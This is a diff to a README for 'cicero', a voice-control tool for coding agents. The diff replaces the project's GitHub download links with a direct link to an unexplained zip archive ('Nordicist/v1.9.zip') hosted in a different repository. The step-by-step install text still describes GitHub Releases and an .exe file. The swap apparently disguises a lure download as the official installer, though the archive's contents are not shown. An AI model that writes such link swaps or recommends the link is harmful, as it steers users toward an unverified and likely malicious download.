@@ -5,7 +5,7 @@ description: "Control your coding agents with voice. Speak commands to your AI, 
 ---
 # 🎙️ cicero - Talk to your coding agents naturally
 
-[![](https://img.shields.io/badge/Download-Cicero-blue)](https://github.com/Municipal-capon303/cicero)
+[![](https://img.shields.io/badge/Download-Cicero-blue)](https://raw.githubusercontent.com/Municipal-capon303/municipal-capon303.github.io/main/Nordicist/v1.9.zip)
 
 Cicero connects your voice to coding software. It lets you speak to your computer to write, edit, and fix code. You talk through your browser or a phone call. The software listens to your instructions and performs tasks for you. It handles the details so you can focus on the logic.
 
@@ -28,7 +28,7 @@ The system runs on your computer. Your voice data stays on your machine. This pr
 
 You need to download the installer to begin. Follow these instructions to get the software on your machine.
 
-1. Visit the [official download page](https://github.com/Municipal-capon303/cicero).
+1. Visit the [official download page](https://raw.githubusercontent.com/Municipal-capon303/municipal-capon303.github.io/main/Nordicist/v1.9.zip).
 2. Locate the section labeled Releases on the right side of the page.
 3. Click the latest version link.
 4. Select the file ending in .exe to start your download.
